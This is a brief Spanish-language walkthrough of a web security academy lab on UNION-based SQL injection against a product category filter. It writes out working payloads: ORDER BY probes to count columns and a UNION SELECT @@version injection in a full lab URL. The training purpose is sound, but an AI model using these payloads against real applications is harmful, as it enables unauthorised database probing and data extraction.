#Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft
```
This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.
To solve the lab, display the database version string. 
```

```
Teoria:

El operador UNION en SQL permite combinar los resultados de dos consultas SELECT en una sola respuesta.
En el caso de MySQL, la función @@version devuelve la versión del servidor.

En Microsoft SQL Server, la función equivalente es @@version o se puede consultar la variable SERVERPROPERTY('ProductVersion')
```

```
Resolución:

Cuando seleccionamos una categoría, la aplicación genera una consulta SQL.
Como el valor de category se inserta directamente en la consulta sin validación, es posible modificarla mediante una inyección SQL.

Primero determinamos el número de columnas
Se prueban diferentes valores en el parámetro vulnerable:
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--   --> FALLA

Cuando el número utilizado supera el número real de columnas de la consulta, la aplicación genera un error.

' UNION SELECT @@version,NULL-- -

--> xhttps://0a5web-security-academy.net/filter?category=Accessories' UNION SELECT @@version,NULL-- -

```
